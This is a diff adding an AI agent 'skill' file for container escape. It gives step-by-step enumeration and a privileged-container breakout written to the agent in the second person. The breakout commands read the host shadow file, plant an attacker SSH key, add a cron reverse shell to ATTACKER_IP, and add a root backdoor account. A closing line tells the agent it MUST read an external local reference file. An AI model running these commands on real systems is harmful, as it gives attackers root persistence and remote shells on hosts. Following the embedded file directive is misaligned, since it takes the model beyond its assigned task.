@@ -1,0 +1,151 @@
+---
+name: offensive-container-escape
+description: "Container escape and breakout techniques targeting Docker, containerd, and Podman runtimes. Covers privileged container breakout via host filesystem mount and nsenter, Docker socket abuse through /var/run/docker.sock, Linux capability exploitation including CAP_SYS_ADMIN, CAP_SYS_PTRACE, and CAP_NET_ADMIN, cgroup v1 notify_on_release escape, runc CVEs such as CVE-2019-5736 and CVE-2024-21626 Leaky Vessels, kernel exploits from within containers, and Dockerfile misconfigurations like --privileged and host namespace sharing. Includes enumeration with capsh, amicontained, deepce, CDK, and nsenter. Maps to MITRE ATT&CK T1611 Escape to Host. Use this skill when the engagement scope includes container breakout, Docker escape, container privilege escalation, host access from container, or when you land inside a containerized environment and need to reach the underlying host."
+---
+
+# Container Escape and Breakout
+
+You have a shell inside a container. Your objective is to break out to the underlying host operating system. Container isolation relies on Linux namespaces, cgroups, seccomp profiles, AppArmor/SELinux, and dropped capabilities. Every misconfiguration in these layers is an escape vector. This skill walks you through systematic enumeration, exploitation of common misconfigurations, abuse of exposed runtime sockets, capability-based escapes, cgroup breakouts, and known CVEs against container runtimes.
+
+## Quick Workflow
+
+1. Confirm you are inside a container (check for `.dockerenv`, cgroup entries, PID 1 process).
+2. Enumerate capabilities, mounts, namespaces, and sockets with automated tools.
+3. Identify the escape vector: privileged mode, socket exposure, dangerous capabilities, cgroup misconfiguration, or vulnerable runtime.
+4. Execute the breakout technique matching the vector.
+5. Validate host access by reading `/etc/hostname`, checking PID namespace, or writing to host filesystem.
+6. Pivot from host access to lateral movement across the cluster or infrastructure.
+
+---
+
+## Phase 1: Container Detection and Enumeration
+
+Before attempting escape, confirm you are containerized and map the attack surface.
+
+### Detecting Container Environment
+
+```bash
+# Check for Docker marker file
+ls -la /.dockerenv
+
+# Check cgroup entries for container identifiers
+cat /proc/1/cgroup | grep -E 'docker|containerd|kubepods|podman'
+
+# Check PID 1 process (containers typically run app process, not init)
+cat /proc/1/cmdline | tr '\0' ' '
+
+# Check for container-specific environment variables
+env | grep -iE 'kubernetes|docker|container|pod'
+
+# Check hostname (often a truncated container ID)
+hostname
+
+# Check mount info for overlay filesystem
+cat /proc/1/mountinfo | head -20
+```
+
+### Automated Enumeration Tools
+
+```bash
+# deepce - Docker enumeration and escalation tool
+# Download and run (if outbound access is available)
+curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
+chmod +x deepce.sh
+./deepce.sh
+
+# CDK - Zero-dependency container penetration toolkit
+./cdk evaluate
+
+# amicontained - Inspect container runtime and capabilities
+./amicontained
+
+# Manual capability check with capsh
+capsh --print
+cat /proc/1/status | grep -i cap
+```
+
+### Decoding Capabilities Manually
+
+```bash
+# Read raw capability hex from /proc
+cat /proc/1/status | grep CapEff
+# Example output: CapEff: 0000003fffffffff
+
+# Decode with capsh
+capsh --decode=0000003fffffffff
+
+# Key dangerous capabilities to look for:
+# CAP_SYS_ADMIN  - mount filesystems, cgroup manipulation, namespace operations
+# CAP_SYS_PTRACE - ptrace any process, cross namespace boundaries
+# CAP_NET_ADMIN  - network namespace manipulation, raw sockets
+# CAP_DAC_OVERRIDE - bypass file read/write/execute permission checks
+# CAP_SYS_RAWIO  - direct I/O to /dev/mem, /dev/kmem
+# CAP_SYS_MODULE - load/unload kernel modules
+# CAP_MKNOD      - create device files
+```
+
+### Checking Namespace Isolation
+
+```bash
+# Compare PID namespace
+ls -la /proc/1/ns/pid
+ls -la /proc/self/ns/pid
+
+# Check if sharing host namespaces
+ls -la /proc/1/ns/ | awk '{print $NF}'
+# If namespace inodes match host, isolation is broken
+
+# Check mount namespace for host mounts
+cat /proc/1/mountinfo | grep -E '/dev/sd|/dev/nvme|hostPath'
+findmnt
+
+# Check for host network namespace
+ip addr show
+# If you see host interfaces (eth0 with host IP), hostNetwork is true
+cat /proc/net/tcp
+```
+
+---
+
+## Phase 2: Privileged Container Breakout
+
+A container run with `--privileged` drops nearly all isolation. It has all capabilities, can see host devices, and has no seccomp or AppArmor restrictions.
+
+### Mount Host Filesystem
+
+```bash
+# List available block devices
+fdisk -l 2>/dev/null || lsblk
+
+# Identify host root filesystem device (commonly /dev/sda1 or /dev/nvme0n1p1)
+# Mount it into the container
+mkdir -p /mnt/host
+mount /dev/sda1 /mnt/host
+
+# Verify host access
+cat /mnt/host/etc/hostname
+cat /mnt/host/etc/shadow
+ls -la /mnt/host/root/
+
+# Drop an SSH key for persistent access
+mkdir -p /mnt/host/root/.ssh
+echo "ssh-rsa AAAA... attacker@host" >> /mnt/host/root/.ssh/authorized_keys
+
+# Plant a reverse shell in cron
+echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /mnt/host/etc/crontab
+
+# Add a backdoor user
+echo 'backdoor:x:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd
+echo 'backdoor:$6$salt$hash:19000:0:99999:7:::' >> /mnt/host/etc/shadow
+```
+
+
+---
+
+## 📚 Deep Reference (Progressive Disclosure)
+
+> ⚠️ **CONTEXT OPTIMIZATION:** The detailed methodology, edge cases, attack vectors, and advanced configurations for this skill are stored externally to save tokens.
+
+To access the full technical reference, you MUST use your iew_file tool to read:
+
+d:\xampp\htdocs\0-fonte\.agent\skills\claude-red-offensive-container-escape\references\reference.md
